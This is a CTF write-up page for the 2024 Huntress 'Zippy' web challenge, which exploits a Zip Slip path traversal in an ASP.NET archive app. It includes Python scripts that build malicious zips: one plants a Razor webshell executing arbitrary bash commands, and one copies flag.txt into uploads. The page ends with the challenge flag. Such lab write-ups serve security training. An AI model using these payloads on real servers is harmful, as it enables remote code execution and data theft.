@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>2024-10-30 Zippy (Web) · the-grizzly-bear</title>
+<meta name="description" content="2024-10-30 Zippy (Web) — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2024-huntress-ctf/2024-10-30-zippy-web.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">Huntress CTF</a> &rsaquo; <a href="index.html">2024-Huntress-CTF</a></div>
+<h1 id="title">2024-10-30 Zippy (Web)</h1>
+
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image.png"><img src="2024-10-30-zippy-web/image.png" alt="image.png" loading="lazy"></a></p>
+<p>Ok some archive management software</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-1.png"><img src="2024-10-30-zippy-web/image-1.png" alt="image.png" loading="lazy"></a></p>
+<p>Looking around for place to exploit, looks like write access to uploads, and the user ID is the folder #</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-2.png"><img src="2024-10-30-zippy-web/image-2.png" alt="image.png" loading="lazy"></a></p>
+<p>Can start to see the files uploaded</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-3.png"><img src="2024-10-30-zippy-web/image-3.png" alt="image.png" loading="lazy"></a></p>
+<p>See specifically no check for path traversal</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-4.png"><img src="2024-10-30-zippy-web/image-4.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-5.png"><img src="2024-10-30-zippy-web/image-5.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-6.png"><img src="2024-10-30-zippy-web/image-6.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-7.png"><img src="2024-10-30-zippy-web/image-7.png" alt="image.png" loading="lazy"></a></p>
+<p>Using Zip Slip to get files added above uploads</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-8.png"><img src="2024-10-30-zippy-web/image-8.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-9.png"><img src="2024-10-30-zippy-web/image-9.png" alt="image.png" loading="lazy"></a></p>
+<p>This works, we can also see and traverse above uploads.</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-10.png"><img src="2024-10-30-zippy-web/image-10.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-11.png"><img src="2024-10-30-zippy-web/image-11.png" alt="image.png" loading="lazy"></a></p>
+<p>Now just have to figure out how to get the flag, struggled with rev and webshells for a while</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-12.png"><img src="2024-10-30-zippy-web/image-12.png" alt="image.png" loading="lazy"></a></p>
+<p>Zip file with Zip Slip.</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-13.png"><img src="2024-10-30-zippy-web/image-13.png" alt="image.png" loading="lazy"></a></p>
+<p>Can see some of the file directory now.</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-14.png"><img src="2024-10-30-zippy-web/image-14.png" alt="image.png" loading="lazy"></a></p>
+<p>Hmm some other errors</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-15.png"><img src="2024-10-30-zippy-web/image-15.png" alt="image.png" loading="lazy"></a></p>
+<p>Almost there, finally a webshell</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-16.png"><img src="2024-10-30-zippy-web/image-16.png" alt="image.png" loading="lazy"></a></p>
+<pre><code class="language-python">import zipfile
+
+def create_razor_webshell_zip():
+webshell_content = """@page
+@model AboutModel
+@{
+string cmdOutput = null;
+if (Request.Method == "POST")
+{
+string command = Request.Form["command"];
+cmdOutput = ExecuteCommand(command);
+}
+}
+
+&lt;h2&gt;Execute a Command&lt;/h2&gt;
+&lt;form method="post"&gt;
+&lt;input type="text" name="command" placeholder="Enter command" style="width: 300px;" /&gt;
+&lt;button type="submit"&gt;Run Command&lt;/button&gt;
+&lt;/form&gt;
+
+@if (cmdOutput != null)
+{
+&lt;h3&gt;Output:&lt;/h3&gt;
+&lt;pre&gt;@cmdOutput&lt;/pre&gt;
+}
+
+@functions {
+private string ExecuteCommand(string command)
+{
+var output = new System.Text.StringBuilder();
+var process = new System.Diagnostics.Process();
+var startInfo = new System.Diagnostics.ProcessStartInfo
+{
+FileName = "/bin/bash", // Use "cmd.exe" on Windows
+Arguments = "-c \" + command + \"", // Corrected syntax for Arguments
+RedirectStandardOutput = true,
+RedirectStandardError = true,
+UseShellExecute = false,
+CreateNoWindow = true
+};
+</code></pre>
+<p>process.StartInfo = startInfo;<br>
+process.OutputDataReceived += (sender, args) =&gt; output.AppendLine(args.Data);<br>
+process.ErrorDataReceived += (sender, args) =&gt; output.AppendLine(args.Data);</p>
+<p>process.Start();<br>
+process.BeginOutputReadLine();<br>
+process.BeginErrorReadLine();<br>
+process.WaitForExit();</p>
+<p>return output.ToString();<br>
+}</p>
+<pre><code>
+}
+"""
+</code></pre>
+<p>with zipfile.ZipFile('shell.zip', 'w') as z:<br>
+z.writestr('../../../../app/wwwroot/../../app/Pages/About.cshtml', webshell_content)</p>
+<pre><code>
+create_razor_webshell_zip()</code></pre>
+<p>Final script that was working</p>
+<pre><code class="language-python">import zipfile
+
+def create_flag_reader_zip():
+    webshell_content = """@page
+@model AboutModel
+@{
+    // Ensure using System.IO for file and path handling
+    string flagContent = null;
+    string flagPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "../../../../app/flag.txt");
+    string outputPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "../../../../app/wwwroot/uploads/0/flag.txt");
+
+    if (System.IO.File.Exists(flagPath))
+    {
+        // Read the flag file
+        flagContent = System.IO.File.ReadAllText(flagPath);
+
+        // Write the flag content to the output path
+        System.IO.File.WriteAllText(outputPath, flagContent);
+    }
+}
+
+&lt;h2&gt;Flag Reader&lt;/h2&gt;
+@if (flagContent != null)
+{
+    &lt;h3&gt;Flag content has been read and saved to /uploads/0/flag.txt&lt;/h3&gt;
+}
+else
+{
+    &lt;h3&gt;Flag file not found or an error occurred.&lt;/h3&gt;
+}
+"""
+
+    with zipfile.ZipFile('flag_reader.zip', 'w') as z:
+        z.writestr('../../../../app/wwwroot/../../app/Pages/FlagReader.cshtml', webshell_content)
+
+create_flag_reader_zip()</code></pre>
+<p>Instead, lets write flag to uploads folder.</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-17.png"><img src="2024-10-30-zippy-web/image-17.png" alt="image.png" loading="lazy"></a></p>
+<p>Get the contents, and there is the flag! Sometimes you have to take a step back, earlier I saw it could read the contents from a curl, and had to mix that with the access and reading the flag to a second location where we could read the data.</p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-18.png"><img src="2024-10-30-zippy-web/image-18.png" alt="image.png" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="2024-10-30-zippy-web/image-19.png"><img src="2024-10-30-zippy-web/image-19.png" alt="image.png" loading="lazy"></a></p>
+<pre><code class="language-python">flag{a074eb7973c4c718790baefc096654dd}</code></pre>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
